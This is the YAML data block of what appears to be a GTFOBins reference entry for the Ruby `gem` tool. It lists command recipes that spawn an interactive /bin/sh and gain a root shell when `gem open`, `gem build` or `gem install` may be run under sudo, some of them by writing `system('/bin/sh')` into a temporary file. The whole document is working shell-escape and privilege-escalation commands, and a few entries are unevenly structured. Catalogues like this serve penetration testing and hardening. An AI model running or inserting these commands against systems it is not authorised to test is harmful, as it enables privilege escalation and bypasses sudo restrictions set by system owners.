---
functions:
  shell:
    - description: This spawns an interactive shell. Requires the name of an installed gem to be provided (`json` is usually installed).
      code: |
        gem open -e "/bin/sh -c /bin/sh" json
  sudo:
    - description: This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/). Requires the name of an installed gem to be provided (`json` is usually installed).
      code: |
        sudo gem open json
        :!/bin/sh
    - description: This executes an arbitrary command as the gem editor. Requires the name of an installed gem to be provided (`json` is usually installed).
    - code: |
        sudo gem open -e "/bin/sh -c /bin/sh" json
    - description: This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
    - code: |
        TF=$(mktemp -d)
        echo 'system("/bin/sh")' > $TF/x
        sudo gem build $TF/x
    - description: This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
    - code: |
        TF=$(mktemp -d)
        echo 'system("/bin/sh")' > $TF/x
        sudo gem install --file $TF/x
---
